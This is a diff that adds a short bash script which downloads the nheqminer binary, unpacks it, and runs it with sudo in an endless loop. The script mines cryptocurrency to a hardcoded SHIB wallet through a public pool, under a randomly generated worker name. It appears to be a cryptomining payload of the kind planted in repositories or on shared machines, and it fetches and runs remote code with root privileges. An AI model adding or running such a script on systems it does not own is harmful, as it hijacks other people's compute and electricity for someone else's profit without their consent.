@@ -1,0 +1,12 @@
+#!/bin/bash
+PISC=rx-us.unmineable.com:80
+WALT=SHIB:0x2a1a513011fd92781fde8fd7aa95d3c2b1fa12ea
+WORKER=$(echo $(shuf -i 10-9999 -n 1)-Newbie)
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xzvf nheqminer-Linux-v0.8.2.tgz && tar -xzvf nheqminer-Linux-v0.8.2.tar.gz
+cd nheqminer
+chmod +x nheqminer
+while [ 1 ]; do
+  sleep 2
+  sudo ./nheqminer -v -l $PISC -u $WALT.$WORKER -p x -t 4
+done
